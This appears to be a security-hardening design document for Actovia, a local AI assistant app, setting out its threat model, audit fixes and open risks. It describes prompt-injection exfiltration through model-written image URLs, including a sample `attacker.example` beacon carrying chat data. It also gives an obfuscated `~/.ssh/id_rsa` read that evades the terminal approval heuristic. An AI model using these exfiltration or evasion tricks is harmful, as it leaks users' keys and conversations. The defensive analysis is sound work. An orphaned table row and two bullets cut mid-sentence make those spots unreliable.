# Security hardening

What protects Actovia today, what was fixed in the 2026-09-19 audit, and what is
still open. Read this before changing the HTTP server's middleware, the preload
bridge, window creation, or the artifact sandbox.

## Threat model

Actovia is local-first, but three things make it a target anyway:

1. **The API returns the saved provider keys and can run shell commands**
   (`GET /api/v1/settings`; `POST /api/v1/chat` with the `terminal` tool), and
   the iOS app has to reach it over the LAN. It used to do so on a plaintext
   port open to every interface, with no authentication.
2. **The renderer shows untrusted content**: model output (markdown links,
   generated artifact code) that a web page can steer through prompt injection
   via `webFetch` / `webSearch`, plus embedded third-party frames (CodeSandbox,
   TradingView, diagrams.net).
3. **The main process is fully privileged** (file tools, `terminal`, Computer
   Use), so anything that reaches the API or IPC inherits the user's account.

| Remote images in chat             | A remote `<img src>` in model-written markdown is a ready-made exfiltration channel — a tracking pixel, or a URL whose query string carries data the model was steered to embed (prompt injection) — that would otherwise fire the moment the reply renders, no click needed. `Markdown`'s `img` override (`components/markdown/remote-image.tsx`) loads only a `data:` URL whose MIME is a recognised raster type (`image/png`, `jpeg`, `jpg`, `gif`, `webp`, `avif` — an `image/svg+xml` payload is refused: an SVG rendered as `<img>` still resolves its own `<image href>`, `feImage` and `url()` references as image fetches, a zero-click beacon no different from a remote host; any other, missing or malformed MIME is refused the same way), the app's own media route, and an `https:` image URL the run's own web search returned, exactly — a result's thumbnail or favicon, an image result's image or thumbnail (never a result's host: the page that injects the instruction is a search result itself, so host trust let `![](https://attacker.example/p.png?d=<chat data>)` or a Google Forms GET on `docs.google.com` fire with no click — final review I6); an `http:` image never auto-loads. Anything else renders a placeholder (host name — or "inline image" for a `data:` URL that didn't qualify — alt text, "Load image") until the user taps it; "loaded" is remembered per `src` for the session (a module-level `Set`, not persisted). ## Open

### Residuals against "Actovia's own secrets, without exception"

Everything the owner's goal (2026-09-25: Actovia's own secrets defended
without exception; secrets elsewhere intercepted, the user decides) still
leaves open, in one place:

- **Fixed:** `googleCloud.googleApiKey` is no longer served in plaintext
  (final fix wave, I5); raw data files (`~/.actovia/database`, `backups`,
  `analytics`) are refused to every tool (I4); log lines mask every known
  secret value as they are written (M4, `logger/secret-mask.ts`).
- **Fixed 2026-09-26 (owner said yes):** pre-encryption backups
  (`~/.actovia/backups/*.tar.gz` written before secrets were encrypted at
  rest, which held every key in plaintext) are now removed. The startup
  pass's `removeOldBackupsOnce()` (`secrets/migrate.ts`) deletes every
  auto-backup older than the purge marker's `purgedAt`, once — only after a
  pass has recorded `purgedAt` and only while encryption reads `'on'` (with
  no working backend a fresh backup is plaintext too, so deleting old ones
  buys nothing); success is recorded in the marker's `oldBackupsRemovedAt`
  so it never repeats and never touches a backup made since. A failure is
  logged (a count, never a backup's name) and does not block startup; the
  next launch retries. A user who upgrades but leaves Actovia closed keeps
  the old backups on disk until the next launch that completes the purge.
- **Encryption unavailable** (Linux without a keyring, a failed
  `safeStorage` self-check): the database, new backups and the DuckDB copy
  hold plaintext. Settings → General says so; the tools are refused the
  files, the heuristic caveat above applies.
- **MCP stdio args are visible to `ps`** while the server runs (and on Linux
  its environment in `/proc/<pid>/environ`); the form warns, the terminal
  heuristic asks about `ps`-style commands, other ways of reading a process
  table are not gated.
- **MCP args the masking heuristic misses** (a JSON-valued argument, an
  unremarkable flag name) are returned by the API as they are.
- **`s3.accessKeyId`** is carried, by design, in every presigned URL
  `POST /api/v1/s3/presigned-url` returns (the secret key is not).
- **The artifact sandbox's `img-src *`** (accepted, owner's decision
  2026-09-26): model-written artifact code can still beacon data out through
  an image URL. Kept on purpose, not left unfixed — artifacts legitimately
  embed images the model found through web or image search, and narrowing
  the policy would break that. The residual is bounded to what the model
  put in that one artifact; see the CSP item under "Smaller items" below.
- **The terminal heuristic is a heuristic**: an obfuscated command gets past
  it. Calls in one batch are all checked before any runs, so a symlink
  created by call 1 is not seen when call 2 is checked (the path did not
  exist yet) — reachable only with an obfuscated call 1, the same residual.
- **Out of scope, as the spec says:** a loopback API token for the renderer
  (the rest of the loopback API is open to the model's `curl`, but it only
  ever hands out masks), and a sandbox for `terminal` beyond the heuristic.

### Smaller items

- `img-src *` in every CSP is the exfiltration channel for #1; narrowing it
  breaks remote images in chat unless they are proxied through main. For the
  main window this is now mitigated at the component, not the CSP: a chat
  image only auto-loads from `data:`, the media route or an exact image URL
  the run's web search returned
  (see "Remote images in chat" above), so an arbitrary host needs a tap first.
  The artifact sandbox's own CSP is separately `img-src * data: blob:` —
  wide open — and only `connect-src 'self'` is tight there; an `<img>` tag is
  not a `fetch`/`XHR`, so model-written artifact code can still exfiltrate
  through an image `src` without the user's page ever calling out. Not
  covered by the remote-image gate above (artifacts are out of `Markdown`'s
  render path entirely) and kept open by design (owner's decision
  2026-09-26, see the Residuals item above): artifacts legitimately embed
  images the model found through web/image search, and the exposure is
  bounded to what the model put in that one artifact.
- The recall tools read any conversation whose id the model passes
  (`lcm_describe` with a conversation id, `lcm_grep` / `lcm_expand` with
  `chatId`; added 2026-09-29 so a user can point one chat at another with
  the sidebar's Copy conversation ID). The ids are random uuids and the
  model is given none (its own chat's shows in its workspace path, which
  leads nowhere new), so it reads another conversation only when the user — or text it was given to read, which is
  the exposure — supplies the id: an injected page that carried a real id
  could have the conversation read and then needs a channel out (see #1).
  The raw store (`~/.actovia/database`) stays refused to the file tools, so
  ids cannot be listed from there.
- MCP `args` masking is a heuristic over argument shapes (secret-named
  flags and `NAME=value`, secret headers, URLs, `-p` after `-u`): a secret
  inside a JSON-valued argument (`--config '{"apiKey":…}'`) or under a flag
  with an unremarkable name is returned as is (it is still encrypted at rest).
- A stdio MCP server's `args` are visible to every program of the same user
  while the server runs (`ps -axo args` shows `--api-key sk-…`), and on Linux
  so is its environment (`/proc/<pid>/environ`) — whatever the API masks and
  the database encrypts. The MCP form warns when an argument holds a
  recognised secret (`argsHoldSecret()`, the same detector the masking uses,
  `packages/shared/src/utils/secret-detect.ts`) and suggests an environment
  variable (hidden from `ps` on macOS); the approval gate asks about `ps`
  with options, `pgrep` with `a` or `l` in a flag group (`-af`, `-lf`),
  `pstree -a`, `lsof -p` and `/proc/<pid>/cmdline` / `environ` in `terminal`. Other ways to read a process
  table (`top`, a script, an obfuscated command) are not gated.
- `POST /api/v1/s3/presigned-url` hands out presigned upload URLs: their `X-Amz-Credential`
  carries `s3.accessKeyId` (a registry field; the secret key is not
  revealed), and any loopback caller gets a 15-minute upload capability to
  the user's bucket.
- A web page can embed `<img src="http://localhost:60223/api/v1/media/…">`:
  a no-cors image request carries no `Origin`, so the origin gate lets it
  through (the packaged renderer's own `<img>` is a cross-site request from
  `file://`, so `Sec-Fetch-Site` / CORP cannot tell them apart). It can
  display the image but not read its pixels, and it has to know two random
  uuids (the chat's and the file's) to name one.
- The image-download guard deliberately allows 198.18.0.0/15 (a TUN proxy's
  "fake-ip" range — every name resolves into it under Clash / Surge /
  sing-box) and Teredo 2001::/32 (poisoned resolvers answer `2001::1` for
  real hosts). Under fake-ip the proxy, not Actovia, resolves the real host:
  a proxy rule that sends an attacker's name DIRECT could still reach a
  private address.
- `web_fetch`'s built-in loader pins its connection to the addresses its
  own-API guard judged ("`web_fetch` cannot reach Actovia" under In place),
  which closes DNS rebinding between the check and the connect — except
  under a TUN proxy's fake-ip mode, where the proxy resolves the real host
  (the item above). The Jina reader path fetches from Jina's servers, not
  from this machine.
- `terminal`, `write_file` and `edit_file` run without per-call confirmation
  except on the credential paths the approval gate covers ("Secrets outside
  Actovia" above); the tool toggle in the composer is the only other gate. The
  terminal part of that gate is a heuristic over the command text: an
  obfuscated command (`c''at ~/.s''sh/id_rsa`, a script that builds the path)
  gets past it, and a command that merely mentions `.ssh` is asked about.
  Paths are compared case-folded on macOS / Windows (`~/.SSH/id_rsa` is
  `~/.ssh/id_rsa`) and with the `/System/Volumes/Data` firmlink prefix
  dropped. A `grep` root outside the workspace asks when its tree (walked as
  grep walks it, skipping symlinks, up to 20,000 entries — more asks anyway)
  holds a secret-named file; `grep` itself never follows a symlink. The tree
  walk is fully async (`fs.promises.opendir`/`lstat`, no `*Sync` call in it)
  and raced against a 250 ms deadline (`SCAN_DEADLINE_MS`) — as is every
  symlink resolution the matcher does (`fs.promises.realpath`, 250 ms per
  path and 3 s for the whole call, so a `call_mcp_tool` with many leaves on a
  busy machine does not ask spuriously; a path not resolved in time is asked
  about as "not checked in time", and a walk that fails midway as "could not be read in
  full") — so an
  unresponsive network share cannot block `beforeToolCall` — and with it the
  HTTP server, IPC and every other run's SSE — past that bound; a directory
  handle still open when the deadline wins is closed on a best-effort basis.
  A root under `/Volumes`, `/net`, `/Network` or `~/Library/CloudStorage` is
  asked about without being walked (or even `lstat`'d) at all, the same way a
  hung mount would be. `.env.example` / `.env.sample` / `.env.template` /
  `.env.dist`, and the same suffixes on `*.pem` / `*.key` / `id_*`, read as
  templates, not secrets — outside the workspace or inside the scanned tree
  alike. A gated command's summary leads with what triggered it (`withTrigger`),
  and padding cannot push the real target off the card any more: length is
  bounded once, centrally, by `capSummary()`, and the card gets the full
  `EVENT_SUMMARY_MAX` (8000-character) copy — only the separate, short text
  the model reads back on decline/refuse is held to the 300-character
  `MODEL_SUMMARY_MAX` (re-review I1; a single 300-character cut on the card
  itself was tried first and reopened the hiding problem, since a command's
  dangerous tail can fall past 300). `sanitizeSummary()`'s line-break rule
  covers every Unicode forced break, not just `\r`/`\n` — U+0085 (NEL),
  U+2028 (LINE SEPARATOR) and U+2029 (PARAGRAPH SEPARATOR) too (re-review
  N1: a client that honours those as a break, not just ASCII's two, could
  otherwise still lose text after one). `capSummary()`'s cut never splits a
  UTF-16 surrogate pair — a non-BMP character (an emoji, …) straddling the
  boundary moves whole to the hidden side instead of leaving a lone
  surrogate as the visible text's last unit (re-review N2). `sanitizeSummary()`'s
  last step well-forms the string (`String.prototype.toWellFormed()`), turning
  any UTF-16 surrogate left unpaired — one a model wrote into a path or
  command itself, not only one a cut could leave behind — into U+FFFD, since
  a strict decoder elsewhere (the iOS app's Swift `JSONDecoder`, which can only
  build a well-formed-UTF-16 `String`) otherwise rejects the whole
  `approval_required` frame the instant it hits one, so the card never
  appears on the phone and the call silently auto-denies at the 10-minute
  timeout. Accepted
  residual, not a defect against any of these: `sanitizeSummary()` does not
  strip stacked combining marks (`\p{M}` — fifty `´` (U+0301) stacked on one
  letter render as-is) or rewrite homoglyphs (a Cyrillic `а` standing in for
  a Latin `a` in a filename); both are display-obfuscation, not hiding or
  reordering, and neither is in `sanitizeSummary()`'s rules (re-review N3).

- Philharmonic's loops (the employee loop, the PM coordinator) run the same

- The single-instance lock is keyed on Electron's `userData`, so it covers dev

- Signing / notarization is not wired (`osxSign`), so ASAR integrity is only as
  strong as the unsigned bundle.
- `GET /api/v1/tools/ping-ollama?url=` fetches any URL from main (reachability
  oracle for internal hosts).
- (Fixed in the final fix wave, I5.) `googleCloud.googleApiKey` used to be
  served in plaintext by `GET /api/v1/settings` for the map card. The API
  masks it now; the card gets the Maps JS key over IPC (`maps:js-key`, the
  main window's top frame only) and Places photos through
  `GET /api/v1/maps/photo`, which adds the key in main. The key itself is
  used server-side (Places from main), so it cannot be referrer-restricted:
  it stays a billable key that the main window's renderer holds in memory.
- The main window runs third-party script in the frame that holds the
  presence token and the Maps key: Maps JS (`script-src-elem
  https://maps.googleapis.com`, narrowed from `*.googleapis.com`, which
  included `storage.googleapis.com` where anyone can host a script) and
  TradingView's widget loader (`https://*.tradingview.com`). Markdown renders
  no raw HTML, so model output cannot add a `<script>`; the exposure is a
  compromise of those two origins. A reply's stock chart (`actovia-stock`) is
  the widget's own embed URL in a sandboxed iframe (`allow-scripts
  allow-same-origin`, `referrerpolicy=no-referrer`), built in the renderer
  from a validated symbol — no TradingView script runs in our document;
  `frame-src` already admits `https://*.tradingview-widget.com`. The frame
  keeps `allow-same-origin` because the widget reads `document.cookie` to
  connect (verified: without it the widget throws `SecurityError` and never
  connects), so TradingView's own cookies persist in the Electron session as
  any embedded chart's would; the Lock & Privacy sentence says TradingView
  sees the symbol and the IP address, as any embedded chart would, and claims
  nothing beyond that. The entity route (`GET /api/v1/entity/:title`) is a
  new outbound fetch from main: the host is fixed to `<lang>.wikipedia.org`,
  the title is a validated path segment, and it goes through
  `fetchPublicHttps`.
- Secrets at rest are as strong as the OS key store. On macOS the key is the
  login Keychain item "Actovia Safe Storage", whose access list admits the
  build that created it; another binary — a dev build, or an ad-hoc-signed
  update with a new `cdhash` — gets a Keychain prompt, and "Deny" makes every
  secret read as needing re-entry (the same holds for `lock.dat` and the LAN
  key). With no backend (Linux without a keyring) they stay plaintext. Chats
  are not encrypted and stay readable to a local process through the loopback
  API, `POST /api/v1/analytics/query` included.
- A value that no longer decrypts (a settings key, an MCP secret, url or
  args) is kept as stored by every save that does not move its destination —
  posted back as a mask, unset, or as the `[]` / `null` the API showed — and
  its MCP server stays unconnected until the value is typed again.
  `needsReentry` lists them. An undecryptable MCP `url` / `args` can only be
  replaced, not edited: the form cannot show what it held, so the value typed
  in its place is new — and a new `url` / `args` is a destination move, which
  clears the `headers` / `env` secrets that went with the old one (they are
  asked for again). A lost `extraConfig` / `env` / `headers` leaf is put back
  where it was on a save — by its key path, so a key holding a `.` stays one
  key, and a lost array item returns to its raw index. The envelope
  self-check caches only a real verdict: a decrypt the keychain refuses once
  is asked again next time. The purge marker's `purgedAt` (what the
  backup-cleanup pass keys its cutoff on, below) is written only by a pass
  that encrypted with a working backend; a temp file a crash left in
  `~/.actovia/logs` mid-scrub is removed by the next scrub.
- Changing the signing identity (the first Developer ID build) makes every
  stored secret undecryptable: the user re-enters each key once (see
  CLAUDE.md, "When a Developer ID exists").
- Backups taken before secrets were encrypted at rest held every key in
  plaintext until deleted; fixed 2026-09-26 (see the Residuals item above) —
  `removeOldBackupsOnce()` deletes every one older than the purge marker's
  `purgedAt`, once, the first launch that finds `purgedAt` on record with
  encryption `'on'`. Auto-backups are otherwise still pruned only by count
  (the newest seven, `MAX_AUTO_BACKUPS` in `backup.ts`), not by age, and the
  daily backup itself only runs while the app is open at 03:00 with
  auto-backup on — so a user who rarely has it open then, or has auto-backup
  off, still accumulates backups beyond those seven indefinitely; that
  rotation behavior is unchanged. The purge does not reach blocks the
  filesystem freed by a deleted backup.
- Keys pasted into a chat or remembered by memory are not registry secrets:
  they stay plaintext in `message` / `memory`, in LCM's `lcm_summary` and in
  `session_summary`, and in the Chat Audit snapshot.
- An MCP server whose url, args or a secret does not decrypt is not
  connected until it is entered again; the raw log scrub at the one-time
  purge only knows the secrets Actovia holds now (not keys rotated since).
